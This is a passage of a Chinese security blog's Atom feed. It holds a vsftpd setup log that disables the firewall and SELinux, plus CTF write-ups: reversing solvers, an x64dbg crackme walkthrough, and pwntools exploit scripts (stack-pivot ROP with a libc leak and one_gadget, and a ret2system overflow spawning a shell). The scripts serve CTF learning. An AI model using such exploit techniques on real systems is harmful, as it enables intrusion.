href="#测速是否成功" class="headerlink" title="测速是否成功"></a>测速是否成功</h4><p>使用一下 <code>nslookup</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/MaK7Sw.png" srcset="/img/loading.gif" alt></p><p>正向反向都成功了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS&quot;&gt;&lt;a href=&quot;#DNS&quot; class=&quot;headerlink&quot; title=&quot;DNS&quot;&gt;&lt;/a&gt;DNS&lt;/h1&gt;&lt;p&gt;全称： domain name system&lt;br&gt;&lt;img src=&quot;http://qiqianyun.chumen77.xyz/
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>linux\_ftp服务搭建踩坑记录</title>
    <link href="http://chumen77.xyz/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/03/11/linux_ftp服务搭建简单记录/</id>
    <published>2020-03-11T05:46:50.000Z</published>
    <updated>2020-06-15T15:06:23.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux-ftp服务搭建简单记录"><a href="#linux-ftp服务搭建简单记录" class="headerlink" title="linux_ftp服务搭建简单记录_"></a>linux_ftp服务搭建简单记录_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单记录一下，ftp的相关需要记录的知识跟搭建所踩的坑。</p><h2 id="两种服务模式"><a href="#两种服务模式" class="headerlink" title="两种服务模式"></a>两种服务模式</h2><ul><li>主动模式：FTP服务器主动向客户端发起连接请求。</li><li>被动模式：FTP服务器等待客户端发起连接请求（FTP的默认工作模式）。<h2 id="vsftpd服务程序"><a href="#vsftpd服务程序" class="headerlink" title="vsftpd服务程序"></a>vsftpd服务程序</h2>ftp是Linux系统中以命令行界面的方式来管理FTP传输服务的客户端工具。我们首先手动安装这个ftp客户端工具，以便在后续实验中查看结果。<br>vsftpd作为更加安全的文件传输的服务程序，允许用户以<strong>三种认证模式</strong>登录到FTP服务器上。</li><li><strong>匿名开放模式</strong>：是一种最不安全的认证模式，任何人都可以无需密码验证而直接登录到FTP服务器。</li><li><strong>本地用户模式</strong>：是通过<strong>Linux系统本地的账户密码</strong>信息进行认证的模式，相较于匿名开放模式更安全，而且配置起来也很简单。但是如果被黑客破解了账户的信息，就可以畅通无阻地登录FTP服务器，从而完全控制整台服务器。</li><li><strong>虚拟用户模式</strong>：是这三种模式中最安全的一种认证模式，它需要为FTP服务单独建立用户数据库文件，虚拟出用来进行口令验证的账户信息，而这些账户信息在服务器系统中实际上是不存在的，仅供FTP服务程序进行认证使用。这样，即使黑客破解了账户信息也无法登录服务器，从而有效降低了破坏范围和影响。<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="html">yum -y install vsftpd</code></pre></li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>主配置文件路径 ：</p><pre><code class="html">/etc/vsftpd/vsftpd.conf</code></pre><p>常用的配置参数以及作用如下：</p><pre><code class="html">参数                                作用listen=[YES|NO]              是否以独立运行的方式监听服务listen_address=IP地址        设置要监听的IP地址listen_port=21               设置FTP服务的监听端口download_enable＝[YES|NO]    是否允许下载文件userlist_enable=[YES|NO]     设置用户列表为“允许”还是“禁止”操作userlist_deny=[YES|NO]      设置用户列表为“允许”还是“禁止”操作max_clients=0                最大客户端连接数，0为不限制max_per_ip=0                 同一IP地址的最大连接数，0为不限制anonymous_enable=[YES|NO]    是否允许匿名用户访问anon_upload_enable=[YES|NO]  是否允许匿名用户上传文件anon_umask=022               匿名用户上传文件的umask值anon_root=/var/ftp           匿名用户的FTP根目录anon_mkdir_write_enable=[YES|NO]    是否允许匿名用户创建目录anon_other_write_enable=[YES|NO]    是否开放匿名用户的其他写入权限（包括重命名、删除等操作权限）anon_max_rate=0               匿名用户的最大传输速率（字节/秒），0为不限制local_enable=[YES|NO]         是否允许本地用户登录FTPlocal_umask=022                本地用户上传文件的umask值local_root=/var/ftp            本地用户的FTP根目录chroot_local_user=[YES|NO]    是否将用户权限禁锢在FTP目录，以确保安全local_max_rate=0              本地用户最大传输速率（字节/秒），0为不限制</code></pre><p>在配置着的时候，注意对在这里对应起来，来控制匿名模式跟本地用户的部分权限。</p><h3 id="开启vsftpd服务"><a href="#开启vsftpd服务" class="headerlink" title="开启vsftpd服务"></a>开启vsftpd服务</h3><pre><code class="html">service vsftpd start  systemctl start vsftpd</code></pre><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="0x1-："><a href="#0x1-：" class="headerlink" title="0x1 ："></a>0x1 ：</h3><p>因为是实验机，随便折腾，为了实验的成功，需要<strong>关闭防火墙</strong> 和<strong>SELinux服务</strong>。</p><h4 id="防火墙："><a href="#防火墙：" class="headerlink" title="防火墙："></a>防火墙：</h4><p>CentOS7.0版本的linux系统的防火墙是firewalld，其他版本的可能是iptables。<br>firewalld防火墙关闭代码：</p><pre><code class="html">关闭防火墙systemctl stop firewalld.service永久禁止防火墙 systemctl disable firewalld.service检查防火墙状态 systemctl status firewalld.service提示：Active: inactive (dead)就表示关闭了。</code></pre><p>iptables防火墙关闭代码 ：</p><pre><code class="html">查询防火墙状态    :    service  iptables status停止防火墙   :        service   iptables stop启动防火墙   :        service   iptables start重启防火墙   :        service   iptables restart永久关闭防火墙    :     chkconfig   iptables off永久关闭后启用    :   chkconfig   iptables on</code></pre><h4 id="SELinux服务："><a href="#SELinux服务：" class="headerlink" title="SELinux服务："></a>SELinux服务：</h4><p><code>setsebool -P ftpd_full_access=on</code>单独处理ftpd。</p><p>或：关闭SELinux</p><pre><code class="html">$ vi /etc/selinux/config</code></pre><p>将 SELINUX=XXX –&gt;XXX 代表级别<br>改为** SELINUX=disabled**<br>然后重启系统，或者执行命令：<code>setenforce 0</code>。</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2:"></a>0x2:</h3><p>发现匿名用户，在连上ftp服务器时候，无法进行写入东西。</p><pre><code class="html">550 Permission denied.</code></pre><p>然后这个目录是:</p><pre><code class="html">/var/ftp/pub</code></pre><p>这就是把这个pub的属主控制为 控制为ftp即可。</p><pre><code class="html">chown ftp pub</code></pre><p>这样就可以了。</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3:"></a>0x3:</h3><p>在本地用户的时候，用root也是无法连接ftp服务的。这是因为vsftpd服务程序所在的目录中默认存放着两个名为“用户名单”的文件（<code>ftpusers和user_list</code>）把ftpusers这里面的root去掉即可。</p><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4:"></a>0x4:</h3><ul><li>在采用本地用户模式登录FTP服务器后，默认访问的是该用户的家目录，也就是说，访问的是/home/linuxprobe目录(系统创建的用户，在home文件夹下都有对应用户名的文件夹)。而且该目录的默认所有者、所属组都是该用户自己，因此不存在写入权限不足的情况。如果读写权限没给，手动设定，给读写权限。</li><li>采用非本地用户模式登录，与采用本地用户模式的区别是：采用非本地用户模式<strong>可以指定FTP文件夹</strong>。<br>￼￼￼￼￼￼￼</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;linux-ftp服务搭建简单记录&quot;&gt;&lt;a href=&quot;#linux-ftp服务搭建简单记录&quot; class=&quot;headerlink&quot; title=&quot;linux_ftp服务搭建简单记录_&quot;&gt;&lt;/a&gt;linux_ftp服务搭建简单记录_&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>安恒抗疫赛</title>
    <link href="http://chumen77.xyz/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/02/29/安恒抗疫赛/</id>
    <published>2020-02-29T04:12:59.000Z</published>
    <updated>2020-03-12T15:11:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒抗疫赛"><a href="#安恒抗疫赛" class="headerlink" title="安恒抗疫赛"></a>安恒抗疫赛</h1><p>很简单的比赛，题也不多，记录一下做的2道简单的Re。</p><h2 id="re1-pyc"><a href="#re1-pyc" class="headerlink" title="re1_pyc"></a>re1_pyc</h2><p>拿到的是一个pyc文件。直接拿到网站上反编译一下：</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) - 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    for i in range(len(flag)):        j = i % 3        if j == 0:            p1 += flag[i]            continue        if j == 1:            p2 += flag[i]            continue        p3 += flag[i]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)while True:    flag = raw_input(&#39;please input flag to check:&#39;)    if rep(base64.b64encode(rail(caser(flag)))) == &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;:        print &#39;Success!you got it!&#39;        break        continue    print &#39;try a gain&#39;</code></pre><p>逻辑挺简单的，直接拿着这个代码改下：</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) + 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    j = 0    x = 25    for i in range(x):        j = i + 13        z = j + 13        p3 += flag[i] + flag[j]         if z &gt;= 38 :            break        p3 += flag[z]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)key = &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;flag = rail(caser(base64.b64decode(rep(key) + &#39;=&#39;)))print(flag)</code></pre><h2 id="maze1"><a href="#maze1" class="headerlink" title="maze1"></a>maze1</h2><p>一个简单的maze问题，不过是c++写的，ida反编译看起来有点难读。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/03LBOC.png" srcset="/img/loading.gif" alt><br>从这里确定下地图，后面的2就是终点。去内存中取出来地图：<br><img src="http://qiqianyun.chumen77.xyz/uPic/x7t4PS.png" srcset="/img/loading.gif" alt><br>去ida继续分析：<br><img src="http://qiqianyun.chumen77.xyz/uPic/S2wojN.png" srcset="/img/loading.gif" alt><br>发现你输入的字符串需要等于10，如果不是直接就失败，长度等于10才继续判断。awsd还是这几个字符控制方向。再联系一下前面的地图，终点是2，只能走10步，猜一波dddddsssss。<br><img src="http://qiqianyun.chumen77.xyz/uPic/3qNEI0.png" srcset="/img/loading.gif" alt><br>就是这个，flag就是去md5加密一下出来的字符串。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒抗疫赛&quot;&gt;&lt;a href=&quot;#安恒抗疫赛&quot; class=&quot;headerlink&quot; title=&quot;安恒抗疫赛&quot;&gt;&lt;/a&gt;安恒抗疫赛&lt;/h1&gt;&lt;p&gt;很简单的比赛，题也不多，记录一下做的2道简单的Re。&lt;/p&gt;
&lt;h2 id=&quot;re1-pyc&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>记录i春秋新春公益赛的两个题</title>
    <link href="http://chumen77.xyz/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/02/25/记录i春秋新春公益赛的两个题/</id>
    <published>2020-02-25T08:55:25.000Z</published>
    <updated>2020-03-12T15:12:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记录i春秋新春公益赛的两个题"><a href="#记录i春秋新春公益赛的两个题" class="headerlink" title="记录i春秋新春公益赛的两个题"></a>记录i春秋新春公益赛的两个题</h1><h2 id="吃鸡神器"><a href="#吃鸡神器" class="headerlink" title="吃鸡神器"></a>吃鸡神器</h2><p>这个题目是比赛时没做，因为有一段时间没做re题目了，下来看到这个题做出的人不算少，就去尝试做一做。<br>源程序是qt写的，以前听室友说过qt的程序ida是静态分析不了的，函数调用太多了，就直接动态分析。这个题目应该是有多线程od打开直接是黑屏的，左下角显示新建了一个线程，第一次做这种题也比较没有头绪。折腾了一会发现用的<strong>x64dbg</strong>可以调试了。</p><h3 id="x64dbg调试"><a href="#x64dbg调试" class="headerlink" title="x64dbg调试"></a>x64dbg调试</h3><p>一直运行程序等代码跑到0x40开头的段，进入login 的模块。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aQ0jsg.png" srcset="/img/loading.gif" alt><br>找下字符串：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/AL01Oy.png" srcset="/img/loading.gif" alt><br>在这里下个断点。因为登陆失败会跳转输出这个字符串的函数，看看能不能查看出是从哪里跳转过来的然后在密码判断那里来继续分析。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Ior8oA.png" srcset="/img/loading.gif" alt><br>看到已经跳转过来了，但是发现附近没有什么判断的地方，去根据那个从哪里跳转过来，追过去看到登陆成功调用welcome的函数，但是也没有发现什么可以利用的那里的判断不是要找的密码判断。<br>换个思路，还是跳转到失败那里，但是在<strong>上层函数</strong>的栈中，因为存在判断登陆的用户跟密码，应该会存在我们输入的东西，寻找一下密码跟用户名。<br><img src="http://qiqianyun.chumen77.xyz/uPic/ExvIk2.png" srcset="/img/loading.gif" alt><br>找到了，给用户名对应的地址下一个硬件断点，来看看哪里会访问这里，只要访问了基本距离要找的函数差不远了。其中第二个字符对应处，经测试不应该下断点。一直让其F9运行，等到了用户0x40段代码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/guzN1A.png" srcset="/img/loading.gif" alt><br>发现这段是在一个个字符处理<strong>lubenwei</strong>字符串，还有<code>ret</code>，这样基本就是了。ret以后到：<br><img src="http://qiqianyun.chumen77.xyz/uPic/nTZ8tn.png" srcset="/img/loading.gif" alt><br>注意此处的汇编语句，并看下寄存器情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bua46M.png" srcset="/img/loading.gif" alt><br>刚刚走过call函数，下面且有cmp对比语句，并且发现了输入的密码<code>12345678</code>，十分可疑了。<br>在这几处函数下断点，重新点击login验证进行分析，发现的确断在了下的这几个函数，结合寄存器查看发现，输入的密码跟走过<code>0x004021D3</code>这个函数后传过来的eax进行对比。并且一对比以后就进入了，提示登陆失败的地方。所以这个eax就是用户的密码了。<br>测试以后发现是小写的<code>eax  41D26F00</code> ：41d26f00,输入密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/psY0ix.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r3WZrp.png" srcset="/img/loading.gif" alt><br>Ok,成功了。</p><h2 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h2><p>这个题目名字就是borrowshack 接栈。含义就是转移栈，正好最近刚学过，就动手去做了，结果卡了很久，但也学到很多，此前练习的栈迁移题目没有这题的情况。</p><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">[*] &#39;/media/psf/mypwn2/xcgys/borrowstack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-60h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  puts(&amp;s);  read(0, &amp;buf, 0x70uLL);  puts(&quot;Done!You can check and use your borrow stack now!&quot;);  read(0, &amp;bank, 0x100uLL);  return 0;}</code></pre><p>代码是很简单的，bank的地址在bss段，以后留着做栈迁移就可以了 。溢出地址还是只可以控制ebp，跟retadress。接下来就是自己学到的了，自己手动调试了一段时间才发现的。</p><h4 id="坑点（学到的新东西）"><a href="#坑点（学到的新东西）" class="headerlink" title="坑点（学到的新东西）"></a>坑点（学到的新东西）</h4><p>先说下这个程序的情况：<br>bank 的地址 <code>.bss:0000000000601080</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/Q3hjpz.png" srcset="/img/loading.gif" alt><br>注意看下bss段里got段的距离，一共是40个字节，是比较近的。如果按我以前的做法直接迁移到bank这地址做新栈，当栈迁移过去以后，使用puts函数来泄露某个函数got对应的地址时，会发现当调用puts以后，会进入libc中开始一连串的函数调用：第一个<br><img src="http://qiqianyun.chumen77.xyz/uPic/2Zk09z.png" srcset="/img/loading.gif" alt><br>发现还没有push，此时rsp就是bank的地址了，push过后肯定栈指针开始慢慢变小，往bss段上方延伸。<br>当调用第二个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/v02DA7.png" srcset="/img/loading.gif" alt><br>发现已经到了bss上方的got表段，这样毫无疑问，里面的值就会改动了，程序接下来发生什么是很难预测的，并且个人也拿不到原本的got地址，从而算出libc基地址。并且会发现，当以往回到start处清理栈想再次利用漏洞的时候，也是不行了，也是因为不知道什么数据被改动，造成了影响。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>就是把栈迁移到bss段的尽量靠后，这样就会尽量不影响到got表和原本正常的数据。返回地址不再是自己常常用的start处，换成其他合适的地方。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./borrowstack&#39;)# io = remote(&#39;123.56.85.29&#39;,3635)elf = ELF(&#39;./borrowstack&#39;)# libc = elf.libcleave_addr = 0x0400699offset = 200buf_addr = 0x000601080padding = 0x60start_addr = 0x0400626p = &#39;\x00&#39;* padding + p64(buf_addr+offset) + p64(leave_addr)pop_rsi_rx_ret = 0x400701 io.recvuntil(&#39;want\n&#39;)raw_input(&#39;-&gt;&#39;)io.send(p)io.recvuntil(&#39;stack now!\n&#39;)libc_start_main =  elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]pop_rdi_ret = 0x400703read_got = elf.got[&#39;read&#39;]p = flat([&#39;b&#39;*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr])raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))print(hex(puts_add))obj = LibcSearcher(&#39;puts&#39;,puts_add)libc_base = puts_add - obj.dump(&#39;puts&#39;)print(hex(libc_base))sleep(0.1)rec = libc_base + 0x4526asystem_addr = libc_base + libc_basebinsh_addr = libc_base + libc_baseprint(hex(system_addr))print(hex(binsh_addr))io.recvline()io.recvuntil(&#39;want\n&#39;)p = &#39;\x00&#39;* padding + p64(1) + p64(rec)io.send(p)io.interactive()</code></pre><h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3><p>结论：当栈迁移到bss段以后，由于libc函数的调用，此时栈慢慢增高，bss段以上的数据也可能会被改动。<br>收获：当再遇到栈迁移问题的时候，要注意bss段与got的距离，返回地址写入start地址，发现出现问题的时候，就该提升栈迁移的地址高度，和找个合适的返回位置，再次利用漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;记录i春秋新春公益赛的两个题&quot;&gt;&lt;a href=&quot;#记录i春秋新春公益赛的两个题&quot; class=&quot;headerlink&quot; title=&quot;记录i春秋新春公益赛的两个题&quot;&gt;&lt;/a&gt;记录i春秋新春公益赛的两个题&lt;/h1&gt;&lt;h2 id=&quot;吃鸡神器&quot;&gt;&lt;a href=&quot;#吃
      
    
    </summary>
    
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>XCTF\_pwn新手</title>
    <link href="http://chumen77.xyz/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/"/>
    <id>http://chumen77.xyz/2020/02/17/XCTF_pwn新手/</id>
    <published>2020-02-17T12:42:23.000Z</published>
    <updated>2020-02-28T09:12:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-pwn新手"><a href="#XCTF-pwn新手" class="headerlink" title="XCTF_pwn新手"></a>XCTF_pwn新手</h1><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/17/XCTF_pwn新手/images/15819436335898.jpg" srcset="/img/loading.gif" alt="-w605"><br>漏洞就在这s处，gets可以无限读取，导致栈溢出。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>第一个fgets获取时候，读取一个<code>/bin/sh\x00</code>进去，因为name的地址是固定的。</li><li>get函数获取时候，padding + system_plt +name地址即可。</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./cgpwn2&#39;)io = remote(&#39;111.198.29.45&#39;,40540)elf = ELF(&#39;./cgpwn2&#39;)io.recvuntil(&#39;name\n&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(&#39;/bin/sh\x00&#39;)system_plt = elf.symbols[&#39;system&#39;]padding = 0x26 + 4binsh_add = 0x0804A080payload = padding * &#39;a&#39; + p32(system_plt) + p32(0x0804A080) + p32(binsh_add)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF-pwn新手&quot;&gt;&lt;a href=&quot;#XCTF-pwn新手&quot; class=&quot;headerlink&quot; title=&quot;XCTF_pwn新手&quot;&gt;&lt;/a&gt;XCTF_pwn新手&lt;/h1&gt;&lt;h2 id=&quot;cgpwn2&quot;&gt;&lt;a href=&quot;#cgpwn2&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
</feed>
